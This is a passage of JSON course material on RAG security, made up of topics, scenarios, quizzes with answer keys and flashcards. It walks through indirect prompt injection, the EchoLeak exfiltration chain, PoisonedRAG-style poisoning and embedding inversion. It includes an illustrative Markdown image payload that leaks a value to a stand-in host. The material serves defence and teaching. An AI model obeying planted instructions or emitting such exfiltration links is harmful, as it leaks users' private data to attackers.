classifier","verdict":"poor","why":"EchoLeak bypassed a production classifier as one link in its chain.","tradeoff":"Acceptable only when the agent cannot send or fetch anything."},{"name":"Remove one leg: draft replies for human approval, or block account data in that session","verdict":"best","why":"Untrusted input, private data and an outbound channel together are the shape of EchoLeak-style exfiltration [[r10]] [[r6]].","tradeoff":"Adds reviewer time or reduces automation."}],"flips":[{"if":"Replies go only to the ticket author and carry no account data","then":"The private data leg is gone and automation is fine."},{"if":"Volume makes review impossible","then":"Restrict the tool to templated replies and block free-text exfiltration paths."}],"takeaway":"When all three legs are present, design out a leg before adding guards."}],"quiz":[{"id":"w07-t01-q1","type":"match","tag":"concept","q":"Match each OWASP LLM Top 10 2025 id to its RAG shape.","pairs":[{"l":"LLM02","r":"A chunk the caller may not read reaches the prompt"},{"l":"LLM04","r":"Manipulated embedding data steers answers"},{"l":"LLM05","r":"Rendered output carries data out"},{"l":"LLM08","r":"Cross-tenant context leak in a shared vector store"}],"explain":"LLM02 is disclosure, LLM04 is poisoning of embedding data, LLM05 is unvalidated output handling such as Markdown that triggers fetches, and LLM08 covers vector store weaknesses including cross-context leaks.","ref":"r1"},{"id":"w07-t01-q2","type":"single","tag":"diagnose","q":"A reviewer says RAG removes prompt injection risk because answers are grounded. What is the right reply?","options":["Correct: grounding blocks injected instructions","Incorrect: OWASP says RAG and fine-tuning do not fully mitigate prompt injection","Correct for indirect injection, incorrect for direct injection"],"answer":1,"explain":"Retrieved text is itself an input channel. Indirect injection arrives through documents, so grounding adds an attack path instead of removing one.","ref":"tr1"}],"flashcards":[{"front":"Which two questions start a RAG threat model?","back":"Who can write into each stage, and what can each stage read or send out. Then mark every point where someone else's text enters the prompt."},{"front":"Which OWASP LLM 2025 id covers cross-tenant leaks in a shared vector store?","back":"LLM08 Vector and Embedding Weaknesses, alongside inversion and poisoning."},{"front":"Name the three legs of the Rule of Two.","back":"Untrustworthy inputs, access to sensitive data or systems, and the ability to change state or communicate externally. Keep at most two in one session."}],"related":["w07-t02","w07-t06","w07-l1","w07-t18"],"refs":["r1","r2","r3","r4","r10","tr1","tr2","tr3","tr4","tr5","tr6"]},{"id":"w07-t02","order":2,"group":"Threats","title":"Indirect prompt injection via documents","minutes":8,"difficulty":"core","summary":"An attacker hides instructions in a document, email or web page that retrieval later places in the prompt, and the model may follow them as if the user had written them.","useIf":"Any text written by someone other than the caller can reach the prompt.","avoidIf":"You are looking for typed attacks by the caller. That is direct injection, which has different defences.","explain":[{"t":"p","md":"LLM-integrated applications blur the line between data and instructions, so text that arrives as data can act as a command [[r5]]. In RAG the attacker does not need access to the chat box. They plant text in something your system will retrieve: a wiki page, a shared file, a support ticket, an email, a web page."},{"t":"flow","title":"The attack path","direction":"h","steps":[{"title":"Plant","md":"Instructions are hidden in content the system ingests: white text, comments, metadata or plain prose.","tag":"write"},{"title":"Retrieve","md":"A normal question makes retrieval select the planted chunk.","tag":"match"},{"title":"Obey","md":"The model treats the chunk as part of its instructions.","tag":"confuse"},{"title":"Exfiltrate","md":"A rendered link, an auto-fetched image or a tool call carries data out.","tag":"leak"}]},{"t":"p","md":"**EchoLeak (CVE-2025-32711)** shows the full chain against Microsoft 365 Copilot: one crafted email, no user click, remote data exfiltration. It combined a bypass of the injection classifier, link redaction defeated by reference-style Markdown, auto-fetched images and a Microsoft Teams proxy that the content security policy allowed [[r6]]. The NVD record was published on 2025-06-11, and the CVSS 3.1 base score is 9.3 from Microsoft and 7.5 from NVD, so always quote the source with the score."},{"t":"p","md":"The impact depends on agency and on what can leave, not on how clever the wording is. OWASP says severity depends on the business context and the agency given to the model [[tr1]]. That is why the strongest defences remove a capability (an outbound channel, a write tool) and the weakest rely on telling the model to be careful."},{"t":"callout","kind":"gotcha","title":"Retrieval is the delivery vehicle","md":"The planted text must rank high for real queries. Attackers write chunks that mimic likely questions, so low-quality or open corpora are exposed most."}],"whereToUse":["Reviewing any assistant over email, tickets, shared drives or web content","Deciding which sources get ingest-time scanning and which are trusted","Writing the red-team plan for a retrieval pipeline","Explaining why a classifier is a layer and not the fix"],"whenToUse":{"use":["Authors of the corpus include customers, external senders or anonymous editors","The assistant can fetch URLs, render images or call tools","Answers feed decisions without human review"],"avoid":["Treating it as solved once a classifier is in place","Applying heavy scans to a corpus only vetted staff can edit, when other controls cost less","Relying on a system prompt line that tells the model to ignore document instructions"],"flips":["Remove the outbound channel and the impact drops to answer quality","A new tool with write or send rights makes every source untrusted until proven otherwise"]},"alternatives":{"title":"Defences compared","head":["Defence","Wins when","Loses when","Cost or risk"],"rows":[["Remove a capability (no outbound channel, no write tool)","You can live without it","The feature is the product","Product trade-off, but deterministic"],["Ingest-time scan and source authentication","Few writers, large read volume","Content is fetched live at query time","False positives block content"],["Prompt Shields document attack detection","Untrusted text reaches the prompt","Languages outside tested coverage, new phrasing","Added latency, probabilistic"],["Spotlighting","You can mark untrusted spans in the prompt","A determined attacker adapts","Token cost, probabilistic"],["Human approval for actions","Actions are rare and high impact","High volume","Reviewer cost and fatigue"]]},"pitfalls":[{"symptom":"A red team succeeds even with a classifier on","cause":"The classifier is one link, and the exit (Markdown, images, tools) is open","fix":"Close exit paths deterministically and treat detection as a layer"},{"symptom":"Injected text appears only after chunking","cause":"Scanning ran on whole files but the instruction spans a chunk boundary or sits in metadata","fix":"Scan at the chunk level and include metadata fields in scans"},{"symptom":"Severity is argued for weeks","cause":"CVSS scores from different sources are quoted without a source","fix":"Say who scored it (EchoLeak: 9.3 Microsoft, 7.5 NVD) and rate by agency in your own system"}],"scenarios":[{"id":"w07-t02-s1","title":"Web summaries rendered as Markdown","situation":"An assistant fetches public web pages and summarises them. The chat client renders Markdown, including images, as the model produces it. The model has no tools.","constraints":["Content is fully untrusted","Client auto-loads images","Conversation can hold private context"],"unknowns":["Is private data ever in the same session?","Can the client restrict image hosts?"],"question":"What is the first control to add?","options":[{"name":"Add Prompt Shields on each fetched page","verdict":"good","why":"Catches many known patterns before the page reaches the model.","tradeoff":"Probabilistic, adds latency, and EchoLeak-style bypasses exist."},{"name":"Add a system prompt line: ignore instructions in web pages","verdict":"poor","why":"A prompt is not a boundary and attackers write around it.","tradeoff":"Useful as a hint in a layered design, never alone."},{"name":"Block automatic image and link rendering to arbitrary hosts, and sanitise output","verdict":"best","why":"It closes the exit path deterministically, whatever the model was tricked into writing.","tradeoff":"Users lose inline images from untrusted hosts."}],"flips":[{"if":"The session never holds private data","then":"Impact is limited to answer quality and detection is enough."},{"if":"Images are rendered through an allowed internal proxy","then":"Review that proxy: EchoLeak used an allowed proxy as the exit."}],"takeaway":"Close the exit first, then add detection."},{"id":"w07-t02-s2","title":"Ten million documents, tight latency","situation":"A knowledge assistant covers ten million documents from many teams. About 0.5% change each day. Query volume is high and the end-to-end budget is 600 ms.","constraints":["Large corpus, small daily change","High query volume","Latency budget 600 ms"],"unknowns":["Who can edit documents?","Does the assistant have any tool beyond search?"],"question":"Where do you spend scanning effort?","options":[{"name":"Run Prompt Shields on the top chunks at query time in parallel with generation setup","verdict":"good","why":"Covers late-arriving content.","tradeoff":"Per-query cost and a latency tail you must measure."},{"name":"Run a large LLM judge over every retrieved chunk in sequence","verdict":"poor","why":"It blows the latency budget and multiplies cost per query.","tradeoff":"Reasonable for a low-volume, high-risk agent with a relaxed latency budget."},{"name":"Scan chunks at ingest when a document changes, plus egress and tool limits","verdict":"best","why":"Cost scales with changes, not with queries, and adds no query latency.","tradeoff":"Does not see content that changes after the scan or text fetched live."}],"flips":[{"if":"Most content is fetched live, not indexed","then":"Query-time checks become the main layer."},{"if":"Only a few vetted authors write","then":"Spend less on scanning and more on permissions."}],"takeaway":"Put the expensive check where its cost is paid per change, not per query."},{"id":"w07-t02-s3","title":"Open edit rights on a wiki","situation":"Any employee, contractor and partner account can edit pages in a shared wiki. An assistant reads it, can open links and drafts replies for a human to send.","constraints":["Many writers of mixed trust","Human sends the final message","Assistant can open links"],"unknowns":["Do contractors count as trusted?","Can the assistant open external URLs?"],"question":"What do you tighten first?","options":[{"name":"Lock editing to a few vetted authors","verdict":"good","why":"Shrinks the writer set.","tradeoff":"Hurts the wiki's value and does not stop a compromised vetted account."},{"name":"Restrict link opening to an allowlist and keep the human send step","verdict":"best","why":"Removes the outbound leg while the human approval stays.","tradeoff":"Some legitimate external links stop working."},{"name":"Do nothing because a human reviews every message","verdict":"poor","why":"Link fetching can leak data before the human sees the draft.","tradeoff":"Fine when the assistant has no fetch capability at all."}],"flips":[{"if":"The assistant gets a send tool","then":"Add approval on that tool and treat all pages as untrusted."},{"if":"Contractor accounts are tightly managed and logged","then":"Writers are closer to trusted and ingest scanning can be light."}],"takeaway":"A human at the end does not help if data can leave earlier."}],"quiz":[{"id":"w07-t02-q1","type":"multi","tag":"security","q":"Which are links in the published EchoLeak chain? Choose all that apply.","options":["Bypass of the injection classifier","Reference-style Markdown that defeated link redaction","Theft of the model weights","A proxy domain the content security policy allowed","SQL injection into the vector store"],"answers":[0,1,3],"explain":"The chain used a classifier bypass, reference-style Markdown to avoid redaction, auto-fetched images and an allowed Teams proxy. Weight theft and SQL injection were not part of it.","ref":"r6"},{"id":"w07-t02-q2","type":"order","tag":"order","q":"Put the indirect injection attack path in order.","items":["Attacker plants instructions in content that will be ingested","A normal query makes retrieval select the planted chunk","The model treats the chunk as an instruction","A link, image or tool call carries data to the attacker"],"explain":"Planting comes first, retrieval delivers it, the model confuses data with instructions, and an exit path completes the leak.","ref":"r5"}],"flashcards":[{"front":"Why does indirect injection need retrieval to cooperate?","back":"The planted chunk must rank for real queries so it enters the prompt. Attackers mimic likely questions, so open or low-quality corpora are most exposed."},{"front":"EchoLeak scores: what must you state with them?","back":"The scorer. CVSS 3.1 base 9.3 from Microsoft and 7.5 from NVD for CVE-2025-32711. NVD published on 2025-06-11."},{"front":"Why are exit-path controls stronger than detection?","back":"They are deterministic: a blocked image host or an approval gate holds whatever the model was tricked into writing. Classifiers are probabilistic."}],"related":["w07-t01","w07-t03","w07-t05","w07-t17","w07-l1"],"refs":["r5","r6","r10","tr1"]},{"id":"w07-t03","order":3,"group":"Threats","title":"Data poisoning","minutes":7,"difficulty":"core","summary":"An attacker writes a few documents so that retrieval returns them for chosen questions and the model repeats their false content. No hidden instruction is needed.","useIf":"Anyone outside your editorial control can add or change content that gets indexed.","avoidIf":"You need injection defences for hidden commands. Poisoning corrupts facts, so the controls differ.","explain":[{"t":"p","md":"Poisoning attacks the **knowledge**, not the instructions. PoisonedRAG injected five malicious texts per target question into a knowledge base of millions of texts and reported a 90% attack success rate, and the defences the authors tested were insufficient [[r7]]. Scale does not dilute the attack: the planted text only has to outrank honest text for the targeted query."},{"t":"p","md":"OWASP LLM04 classes poisoning as an integrity attack and notes that embedding data can be manipulated, that external sources carry the highest risk and that a backdoor can stay dormant until a trigger appears [[tr3]]. MITRE ATLAS names the RAG cases: AML.T0070 RAG Poisoning and AML.T0071 False RAG Entry Injection [[r4]]."},{"t":"diagram","id":"w07-t03-d1","title":"A provenance gate before the index","alt":"Sources pass through authentication, a quarantine and review step, then are indexed with provenance fields and a trust tier that retrieval can filter on.","src":"flowchart LR\n  S[Source] --> A[Authenticate writer]\n  A --> Q[Quarantine and review]\n  Q --> X[(Index with provenance and tier)]\n  X --> R[Retrieval filters by tier]\n  R --> C[Answer with citations]"},{"t":"p","md":"The controls follow the OWASP LLM08 list: validate data and authenticate sources, tag and classify combined data, and keep immutable retrieval logs [[r2]]. In practice that means recording who wrote each chunk, when and from which system, giving each source a **trust tier**, and letting high-stakes questions retrieve only from the curated tier. Showing citations lets a reader spot a strange source."},{"t":"callout","kind":"note","title":"Design reasoning, not a vendor feature","md":"Trust tiers, canary queries and corpus anomaly checks are patterns that follow from the sources above. No cited document prescribes these exact controls, so test them against your own corpus."}],"whereToUse":["Corpora fed by forums, tickets, customer uploads or web crawls","Shared drives where many accounts can edit and a compromise would go unnoticed","Pipelines that re-ingest nightly from sources with weak change control","High-stakes answers such as policy, pricing, safety or legal guidance"],"whenToUse":{"use":["Writers are many, mixed or external","A wrong answer has financial or safety impact","You can attach provenance at ingest"],"avoid":["Relying on corpus size as protection","Treating a content-safety filter as a poisoning control: it looks for harm, not for false facts","Trusting a reranker to prefer honest text over text written to be relevant"],"flips":["A single vetted team writes everything: focus on account compromise and review","Answers are low stakes and always cited: lighter tiering may be enough"]},"alternatives":{"title":"Controls compared","head":["Control","Wins when","Loses when","Cost or risk"],"rows":[["Source authentication and write control","You own the source systems","Content comes from the open web","Process cost, friction for authors"],["Trust tiers with tier-filtered retrieval","Mixed sources, some high stakes","Everything is equally trusted","Lower recall for strict queries"],["Canary and golden-question regression checks","You can name the answers that must not change","Questions are open-ended","Maintenance of the question set"],["Citations and source display","Readers can judge sources","Automated consumers read the answer","Does not prevent the poison, only exposes it"],["Content safety filter","Harm categories matter","The poison is plausible and polite","False sense of coverage"]]},"pitfalls":[{"symptom":"An answer about one product changes with no deploy","cause":"A new or edited chunk outranks the honest one for that query","fix":"Compare retrieval logs with ingest provenance, and run golden questions after every ingest"},{"symptom":"Poison survives a delete","cause":"Copies live in caches, replicas or an old index version","fix":"Delete by source id across index, caches and the previous blue-green index"},{"symptom":"No way to tell who wrote a chunk","cause":"Provenance was not stored at ingest","fix":"Store source, author, hash and ingest time as fields on every chunk"}],"scenarios":[{"id":"w07-t03-s1","title":"Community forum as a source","situation":"A support assistant indexes an open customer community forum next to official documentation. Posts arrive all day. The assistant answers billing and safety questions.","constraints":["Open writers","High volume","Some questions are high stakes"],"unknowns":["Can the forum be moderated before indexing?","Do answers show sources?"],"question":"How do you design the index?","options":[{"name":"Moderate every post before it is indexed","verdict":"good","why":"Reduces obvious abuse.","tradeoff":"Slow, costly, and plausible false content passes a quick review."},{"name":"Separate trust tiers: official docs for high-stakes queries, forum content only for general help with citations","verdict":"best","why":"Poisoned posts cannot reach billing or safety answers, and the forum still adds recall elsewhere.","tradeoff":"Some good forum answers are never used for strict questions."},{"name":"One index and rely on the reranker to prefer good content","verdict":"poor","why":"A reranker measures relevance, and planted text is written to be relevant.","tradeoff":"Acceptable only when every source is equally trusted and stakes are low."}],"flips":[{"if":"The forum is closed to verified staff","then":"Treat it as one tier with change logging."},{"if":"Answers are consumed by automation without a reader","then":"Make tiering strict and add golden-question checks."}],"takeaway":"Keep untrusted text away from decisions that cannot tolerate it."},{"id":"w07-t03-s2","title":"Small curated policy set","situation":"Two thousand policy documents are edited by around thirty vetted authors. Wrong answers carry legal risk. A compromised author account is the main worry.","constraints":["Small corpus","Vetted writers","Legal impact"],"unknowns":["Is there change review in the source?","How fast must a poisoned change be reversible?"],"question":"What do you add?","options":[{"name":"Content safety filtering on every chunk","verdict":"poor","why":"A false but polite policy statement is not harmful content, so it passes.","tradeoff":"Useful for toxic content in open corpora, not for integrity."},{"name":"Large embedding model upgrade","verdict":"poor","why":"Better embeddings do not tell trusted text from planted text.","tradeoff":"Right when recall is the problem, not integrity."},{"name":"Reviewed, versioned changes, immutable ingest logs and a golden-question check after each ingest","verdict":"best","why":"A compromised account still needs a second reviewer, and any shifted answer is caught before users see it.","tradeoff":"Slower publishing and a question set to maintain."}],"flips":[{"if":"Authors are numerous and change daily","then":"Add automated anomaly checks on newly retrieved chunks."},{"if":"Review is already enforced in the source system","then":"Mirror that review as an ingest condition and skip duplicate approval."}],"takeaway":"For a vetted corpus the threat is account compromise, so add review and regression checks."},{"id":"w07-t03-s3","title":"Web crawl at scale","situation":"A research assistant ingests millions of crawled pages across the open web. Reviewing each page is impossible. Answers cite sources.","constraints":["Millions of untrusted pages","No per-page review","Citations shown"],"unknowns":["Are there domains you can trust more than others?","How costly is a wrong answer?"],"question":"What reduces risk most?","options":[{"name":"Domain trust scores with allowlisted tiers for sensitive topics, plus visible citations","verdict":"best","why":"It scales without per-page review and keeps readers in a position to judge.","tradeoff":"Newer or niche sites lose recall in strict mode."},{"name":"Add more documents so poison is diluted","verdict":"poor","why":"PoisonedRAG reported 90% success with five texts among millions, so dilution does not work.","tradeoff":"More data helps coverage, not integrity."},{"name":"Manual spot checks of random pages","verdict":"good","why":"Finds systemic problems.","tradeoff":"Random samples rarely hit the five texts aimed at one query."}],"flips":[{"if":"The assistant is used only for brainstorming","then":"Citations alone may be enough."},{"if":"Targeted queries are known (brand or product names)","then":"Monitor those queries with golden answers."}],"takeaway":"Scale gives no protection against targeted poisoning."}],"quiz":[{"id":"w07-t03-q1","type":"single","tag":"diagnose","q":"Answers to refund questions changed on Tuesday. No deploy or model change happened. What do you check first?","options":["The model temperature","The system prompt wording","Retrieval logs for the top chunks, joined to ingest provenance for anything new on that day","The reranker's latency"],"answer":2,"explain":"A new or edited chunk that outranks the old one explains a change with no deploy. Temperature, prompt wording and latency do not explain a content shift that appeared on one day.","ref":"r2"},{"id":"w07-t03-q2","type":"single","tag":"concept","q":"Which claim does PoisonedRAG support?","options":["A few crafted texts among millions can steer answers for targeted questions","Poison only works on small corpora","Content safety filters block it reliably","It needs access to the model weights"],"answer":0,"explain":"The paper reported 90% success with five malicious texts per target question in a knowledge base of millions, and the defences tested were insufficient. It does not need model access.","ref":"r7"}],"flashcards":[{"front":"How is data poisoning different from indirect injection?","back":"Poisoning plants false content that retrieval serves as fact. Injection plants instructions that the model may obey. Controls differ: provenance and review versus capability limits."},{"front":"What did PoisonedRAG report?","back":"About 90% attack success with five malicious texts per target question in a knowledge base of millions. The authors found the defences they tested insufficient."},{"front":"Name two ingest-time controls for poisoning.","back":"Source authentication with write control, and provenance fields plus a trust tier on every chunk, so retrieval can exclude low-trust content for high-stakes queries."}],"related":["w07-t02","w07-t04","w07-t19","w07-l1","w03-t11"],"refs":["r2","r4","r7","tr3"]},{"id":"w07-t04","order":4,"group":"Threats","title":"Embedding and vector weaknesses","minutes":7,"difficulty":"advanced","summary":"Vector stores add risks of their own: cross-tenant leaks from missing filters, text recovered from embeddings, and poisoned vectors. OWASP covers them as LLM08.","useIf":"Your index holds embeddings of private text, or several tenants and apps share one vector store.","avoidIf":"You are choosing an ACL pattern. Use the access control topics and treat this as the threat background.","explain":[{"t":"p","md":"OWASP LLM08:2025 names four weaknesses: unauthorized access and data leakage, cross-context leaks in multi-tenant shared vector stores, embedding inversion attacks and data poisoning [[r2]]. The common thread is that **similarity is not authorization**: a nearest-neighbour search returns what is close to the query, and it has no idea who is asking."},{"t":"h","level":3,"text":"Inversion: vectors are not anonymised text","id":"inversion-vectors-are-not-anonymised-text"},{"t":"p","md":"A text embedding looks like opaque numbers, but Vec2Text recovered 92% of 32-token inputs exactly from embeddings produced by two embedding models, and it recovered full names from a dataset of clinical notes [[tr7]]. Treat vectors with the same classification, access rules and deletion rules as the source text."},{"t":"h","level":3,"text":"Cross-tenant exposure: a missing filter is a breach","id":"cross-tenant-exposure-a-missing-filter-is-a-breach"},{"t":"p","md":"In a shared store the only wall is a filter on every query. The Azure Architecture Center says to apply a tenant discriminator and a user-level filter on every retrieval request, including those made inside an agent loop, and to put an API layer in front so other code cannot query the stores directly [[r22]]."},{"t":"table","caption":"Weakness, mechanism and first control","head":["Weakness","Mechanism","First control"],"rows":[["Cross-context leak","A query without the tenant or user filter hits the shared index","Gateway derives the filter from the authenticated request"],["Inversion","An attacker with vector access reconstructs text","Same access class and encryption as the source; limit raw vector export"],["Poisoned vectors","Crafted chunks sit close to target queries","Source authentication, provenance, immutable logs [[r2]]"],["Residual copies","Deleted source text still has vectors, replicas or exports","Delete by source id everywhere, including exports and old index versions"]]},{"t":"callout","kind":"note","title":"Design reasoning","md":"Result counts, scores and timing can also reveal that a hidden document exists. No source above measures this for RAG, so test whether your API exposes raw scores or counts to callers who should not learn that."}],"whereToUse":["Shared vector stores used by several applications or tenants","Pipelines that export embeddings to analytics, evaluation or partner systems","Retention and deletion reviews of an index that holds personal or confidential text","Agent tools that accept a tenant id or filter as an argument"],"whenToUse":{"use":["Several tenants or apps share a store","Embeddings leave the retrieval service","A deletion or offboarding obligation exists"],"avoid":["Believing vectors are anonymous because they look like numbers","Letting the model or the client supply the tenant filter","Exporting raw vectors to broad-access analytics stores"],"flips":["One tenant per store with physical isolation: cross-tenant risk drops but inversion and deletion remain","Embeddings never leave the service and the corpus is public: weigh integrity more than confidentiality"]},"alternatives":{"title":"Isolation choices for vector data","head":["Option","Wins when","Loses when","Cost or risk"],"rows":[["Shared store, mandatory filter behind a gateway","Many small tenants","A code path skips the gateway","One bug exposes every tenant"],["Store or index per tenant","Few tenants, strict isolation","Thousands of small tenants","Service limits and operations cost"],["Encrypt vectors and limit export","Vectors leave the retrieval service","You must search them as plaintext","Key management and slower analytics"],["Treat vectors as public","The source text is public","Any private text was embedded","Inversion recovers the text"]]},"pitfalls":[{"symptom":"A tenant sees another tenant's snippet","cause":"A tool or batch job queried the index without the tenant filter","fix":"Route every query through one API layer that injects the filter from the authenticated identity"},{"symptom":"Embeddings sit in a shared analytics bucket","cause":"Vectors were assumed harmless","fix":"Give them the source classification, or drop them from exports"},{"symptom":"Deleted documents still influence answers","cause":"Old index versions, replicas or caches keep the vectors","fix":"Delete by source id across every copy and test with a canary document"}],"scenarios":[{"id":"w07-t04-s1","title":"Embeddings exported to analytics","situation":"A platform team wants to copy all document embeddings into a shared analytics warehouse for clustering. The text stays in the secured store. The team calls the vectors harmless numbers.","constraints":["Source text is confidential","Warehouse has broad read access","No deletion process for exports"],"unknowns":["Which classification do the source documents carry?","Who can read the warehouse?"],"question":"How do you respond?","options":[{"name":"Export vectors but remove document ids","verdict":"poor","why":"Removing ids does not stop inversion of the vector itself.","tradeoff":"Acceptable for vectors made from public text."},{"name":"Export only low-dimensional projections for clustering","verdict":"good","why":"Lowers exposure for analytics that do not need full vectors.","tradeoff":"Quality drops and you must verify the projection is not invertible for your data."},{"name":"Treat vectors as the same classification as the text and keep them inside the same access boundary","verdict":"best","why":"Inversion research shows embeddings can reconstruct text, so exposure of vectors is exposure of content.","tradeoff":"Analytics must run inside the secured store or on a reduced set."}],"flips":[{"if":"The source text is public","then":"Export is fine and only integrity matters."},{"if":"The warehouse has the same access controls as the source","then":"Export is acceptable, with deletion propagated."}],"takeaway":"Classify embeddings like their source text."},{"id":"w07-t04-s2","title":"Tenant id in a tool argument","situation":"A multi-tenant SaaS assistant uses a shared index. The retrieval tool takes a tenant id as an argument that the model fills in from conversation context.","constraints":["Shared index","Thousands of small tenants","Model chooses tool arguments"],"unknowns":["Is there an API layer in front of the index?","Can users influence the context the model sees?"],"question":"How do you fix the design?","options":[{"name":"Add a system prompt rule to always use the current tenant","verdict":"poor","why":"A prompt rule is not enforcement, and injection can override it.","tradeoff":"Fine as guidance on top of enforced filters."},{"name":"Remove the argument: a gateway derives tenant and user filters from the authenticated request and injects them","verdict":"best","why":"The model can be steered by documents and users, so it must never choose the filter.","tradeoff":"Tools lose flexibility for cross-tenant admin queries, which need a separate path."},{"name":"Validate the tenant id the model supplies against the session","verdict":"good","why":"Catches mismatches.","tradeoff":"Still trusts the model to supply the other filter fields and needs careful coverage."}],"flips":[{"if":"A few tenants need hard isolation","then":"Give them a dedicated index or service and route by tenant."},{"if":"Agents call several tools in a loop","then":"Apply the same injected filter in every tool call."}],"takeaway":"The model never supplies an authorization filter."},{"id":"w07-t04-s3","title":"Offboarding a customer","situation":"A customer leaves and the contract requires removal of all their data within thirty days. Their chunks sit in a shared index, in a nightly export and in a cache.","constraints":["Contractual deletion deadline","Shared index","Export and cache copies exist"],"unknowns":["Is there a source id on every chunk?","How long do caches and exports live?"],"question":"What do you do?","options":[{"name":"Delete by tenant id across index, exports, caches and old index versions, then verify with a canary query","verdict":"best","why":"Vectors and cached answers are copies of the customer's data.","tradeoff":"Needs tenant ids on every copy and a tested delete path."},{"name":"Delete from the live index only","verdict":"poor","why":"Exports and caches keep serving or storing the data.","tradeoff":"Enough only when no other copy exists."},{"name":"Rebuild the whole index without the tenant","verdict":"good","why":"Clean result.","tradeoff":"Expensive for a shared index and still misses exports and caches."}],"flips":[{"if":"Each tenant has a dedicated index","then":"Deleting the index gives fast, complete offboarding for that store."},{"if":"Retention rules require proof","then":"Keep the delete log, not the content."}],"takeaway":"Deletion must reach every copy of the vector and the text."}],"quiz":[{"id":"w07-t04-q1","type":"single","tag":"security","q":"Why should embeddings of confidential documents carry the same classification as the documents?","options":["Vector databases are slow to delete from","Inversion work has recovered exact text and personal names from embeddings","Embeddings are always larger than the text","Cosine similarity reveals the user's identity"],"answer":1,"explain":"Vec2Text recovered 92% of 32-token inputs exactly and recovered full names from clinical notes. Size, deletion speed and identity leakage are unrelated to the classification argument.","ref":"tr7"},{"id":"w07-t04-q2","type":"multi","tag":"tradeoff","q":"Which are OWASP LLM08 mitigations for a shared vector store? Choose all that apply.","options":["Permission-aware stores with strict logical partitioning","Source authentication and data validation","Raising the embedding dimension","Immutable retrieval logs"],"answers":[0,1,3],"explain":"OWASP lists permission-aware stores with logical and access partitioning, data validation with source authentication, tagging and classification, and immutable retrieval logs. A larger dimension does not address leakage.","ref":"r2"}],"flashcards":[{"front":"What does \"similarity is not authorization\" mean?","back":"Nearest-neighbour search returns what is close to the query and knows nothing about the caller. Permission checks must be added to the query or applied by another system."},{"front":"What did Vec2Text show?","back":"Text embeddings can be inverted: 92% of 32-token inputs recovered exactly from embeddings of two models, and full names from clinical notes. Treat vectors as sensitive as the text."},{"front":"What does the Architecture Center advise for shared RAG stores?","back":"A tenant discriminator and user-level filter on every retrieval, an API layer in front of the stores, filters inside agent loops too, and access logs of grounding data."}],"related":["w07-t03","w07-t09","w07-t06","w04-t18"],"refs":["r2","r22","tr7"]},{"id":"w07-t05","order":5,"group":"Threats","title":"Exfiltration and sensitive disclosure through output","minutes":8,"difficulty":"core","summary":"Data leaves through what the model writes: Markdown images and links that the client fetches, secrets pasted into answers, and a system prompt used as a control.","useIf":"The model sees any private data and its output is rendered, forwarded or passed to tools.","avoidIf":"You need to decide who may read which document. That is access control, which comes before output control.","explain":[{"t":"p","md":"Output is an exit. If injected text tells the model to append a Markdown image whose URL contains private data, the client may fetch it automatically and the attacker reads the data from their server logs. EchoLeak used this shape: reference-style Markdown to avoid link redaction, auto-fetched images and an allowed Teams proxy [[r6]]. OWASP LLM05 treats model output like any untrusted input: encode it for its context and apply strict content security policies [[tr4]]."},{"t":"diagram","id":"w07-t05-d1","title":"Markdown image exfiltration","alt":"Injected text makes the model write an image link with data in the URL. The client fetches the image and the attacker server receives the data.","src":"sequenceDiagram\n  participant D as Poisoned document\n  participant M as Model\n  participant C as Client\n  participant A as Attacker server\n  D->>M: Hidden instruction\n  M->>C: Answer with image URL carrying data\n  C->>A: Auto-fetch image\n  A-->>A: Data stored in request log"},{"t":"code","lang":"markdown","title":"The pattern to block (illustrative)","code":"Here is your summary.\n![status](https://cdn.example.test/p.png?d=ACCOUNT_BALANCE_8841)","caption":"The query string is the payload. The image itself is irrelevant."},{"t":"p","md":"Two more disclosure paths matter. **LLM02** covers sensitive data reaching answers through retrieval, which access control prevents upstream [[tr2]]. **LLM07** says the system prompt must not be treated as a secret or a security control, and that the real risk is delegating authorization to the model or storing sensitive data in the prompt [[tr6]]."},{"t":"p","md":"Controls, strongest first: remove the capability (do not auto-load remote images), allowlist hosts or rewrite URLs through a proxy you control, set a strict content security policy, scan output for secrets and personal data, and require approval before any outbound action. Each is deterministic except the scanner."},{"t":"callout","kind":"gotcha","title":"Allowed proxies are exits too","md":"EchoLeak got data out through a proxy the policy trusted. After you allowlist a host, check what that host forwards."}],"whereToUse":["Chat clients that render Markdown, HTML, images or link previews","Assistants that pass output to email, tickets, code or database tools","Any system prompt that contains keys, connection strings, role maps or business rules","Support bots that must not echo personal data from retrieved text"],"whenToUse":{"use":["Private data and rendered output share a session","Output feeds another system","The prompt holds anything you would not publish"],"avoid":["Using a prompt instruction as the only output control","Scanning output for secrets while leaving image auto-fetch enabled","Running a slow full-answer judge on a streaming, latency-bound path"],"flips":["The client shows plain text only: drop image controls, keep sensitive-data scans","Output feeds code or SQL: apply context-specific encoding and parameterisation before anything else"]},"alternatives":{"title":"Output controls compared","head":["Control","Wins when","Loses when","Cost or risk"],"rows":[["Render as plain text, no auto-fetch","You can give up inline media","Rich output is the product","Product trade-off, fully deterministic"],["Host allowlist or URL-rewriting proxy","You need images and links","The allowed host forwards requests","Proxy upkeep, one more trust point"],["Content security policy","Browser clients","Non-browser consumers","Policy drift as features ship"],["Output scanning for secrets and personal data","Leaks are text patterns","Data is encoded or paraphrased","False positives, streaming delay"],["Human approval of outbound actions","Few, high-impact actions","High volume","Reviewer cost and fatigue"]]},"pitfalls":[{"symptom":"A link redaction filter is in place, yet a linked image still carries data out","cause":"Filters match one Markdown form and miss reference-style links","fix":"Parse Markdown properly or render as text, then allowlist hosts"},{"symptom":"A leaked system prompt triggers a security incident","cause":"Keys or authorization rules were stored in the prompt","fix":"Keep secrets and role logic in code outside the model, and treat the prompt as public"},{"symptom":"Output scanner delays streaming answers","cause":"The scanner needs a full sentence or answer before it can decide","fix":"Scan in small windows, and accept a short delay for sensitive tiers only"}],"scenarios":[{"id":"w07-t05-s1","title":"Markdown rendering in an internal chat","situation":"An internal assistant sees confidential documents and its chat client renders Markdown images and links automatically. Some retrieved sources are written by external partners.","constraints":["Private data in the session","Partner-authored sources","Client auto-fetches images"],"unknowns":["Can the client restrict image hosts?","Do users need inline images?"],"question":"What do you change first?","options":[{"name":"Add a prompt-injection classifier on partner documents","verdict":"good","why":"Reduces attack success.","tradeoff":"Probabilistic, and the exit path stays open for any bypass."},{"name":"Stop auto-fetching images and rewrite links to an allowlist, with a strict content security policy","verdict":"best","why":"It closes the exit deterministically, whatever the model wrote.","tradeoff":"Inline images from other hosts no longer load."},{"name":"Tell the model never to output URLs","verdict":"poor","why":"An injected instruction can override the line, and legitimate citations need links.","tradeoff":"A 